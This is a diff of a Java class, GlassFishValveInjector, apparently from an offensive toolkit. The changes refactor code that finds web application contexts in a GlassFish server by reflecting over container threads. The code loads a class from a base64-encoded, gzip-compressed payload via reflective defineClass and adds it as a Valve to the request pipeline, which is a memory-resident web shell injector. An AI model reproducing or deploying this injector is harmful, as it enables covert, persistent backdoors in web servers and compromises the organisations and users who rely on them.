@@ -5,10 +5,7 @@ import java.io.ByteArrayOutputStream;
 import java.io.IOException;
 import java.lang.reflect.Field;
 import java.lang.reflect.Method;
-import java.util.ArrayList;
-import java.util.Arrays;
-import java.util.List;
-import java.util.Map;
+import java.util.*;
 import java.util.zip.GZIPInputStream;
 
 /**
@@ -46,13 +43,11 @@ public class GlassFishValveInjector {
         for (Thread thread : threads) {
             if (thread.getName().contains("ContainerBackgroundProcessor")) {
                 Map<?, ?> childrenMap = (Map<?, ?>) getFieldValue(getFieldValue(getFieldValue(thread, "target"), "this$0"), "children");
-                for (Object key : childrenMap.keySet()) {
-                    Map<?, ?> children = (Map<?, ?>) getFieldValue(childrenMap.get(key), "children");
-                    for (Object key1 : children.keySet()) {
-                        Object context = children.get(key1);
-                        if (context != null) {
-                            contexts.add(context);
-                        }
+                Collection<?> values = childrenMap.values();
+                for (Object value : values) {
+                    Map<?, ?> children = (Map<?, ?>) getFieldValue(value, "children");
+                    for (Object context : children.values()) {
+                        contexts.add(context);
                     }
                 }
             }
@@ -62,21 +57,31 @@ public class GlassFishValveInjector {
 
     @SuppressWarnings("all")
     private Object getShell(Object context) throws Exception {
-        Object obj;
         ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
         if (classLoader == null) {
             classLoader = context.getClass().getClassLoader();
         }
         try {
-            obj = classLoader.loadClass(getClassName()).newInstance();
+            return classLoader.loadClass(getClassName()).newInstance();
         } catch (Exception e) {
             byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
             Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
             defineClass.setAccessible(true);
             Class<?> clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
-            obj = clazz.newInstance();
+            return clazz.newInstance();
         }
-        return obj;
+    }
+
+    @SuppressWarnings("all")
+    public void inject(Object context, Object valve) throws Exception {
+        Object pipeline = invokeMethod(context, "getPipeline", null, null);
+        if (isInjected(pipeline)) {
+            System.out.println("valve already injected");
+            return;
+        }
+        Class valveClass = context.getClass().getClassLoader().loadClass("org.apache.catalina.Valve");
+        invokeMethod(pipeline, "addValve", new Class[]{valveClass}, new Object[]{valve});
+        System.out.println("valve injected successfully");
     }
 
     @SuppressWarnings("all")
@@ -89,19 +94,6 @@ public class GlassFishValveInjector {
             }
         }
         return false;
-    }
-
-    @SuppressWarnings("all")
-    public void inject(Object context, Object valve) throws Exception {
-        Object pipeline = invokeMethod(context, "getPipeline", null, null);
-        if (isInjected(pipeline)) {
-            System.out.println("valve already injected");
-            return;
-        }
-        Class valveClass;
-        String valveClassName = "org.apache.catalina.Valve";
-        valveClass = context.getClass().getClassLoader().loadClass(valveClassName);
-        invokeMethod(pipeline, "addValve", new Class[]{valveClass}, new Object[]{valve});
     }
 
     @SuppressWarnings("all")
@@ -121,7 +113,6 @@ public class GlassFishValveInjector {
     public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
         ByteArrayOutputStream out = new ByteArrayOutputStream();
         GZIPInputStream gzipInputStream = null;
-
         try {
             gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(compressedData));
             byte[] buffer = new byte[4096];
@@ -129,16 +120,13 @@ public class GlassFishValveInjector {
             while ((n = gzipInputStream.read(buffer)) > 0) {
                 out.write(buffer, 0, n);
             }
+            return out.toByteArray();
         } finally {
             if (gzipInputStream != null) {
-                try {
-                    gzipInputStream.close();
-                } catch (IOException ignored) {
-                }
+                gzipInputStream.close();
             }
             out.close();
         }
-        return out.toByteArray();
     }
 
     @SuppressWarnings("all")
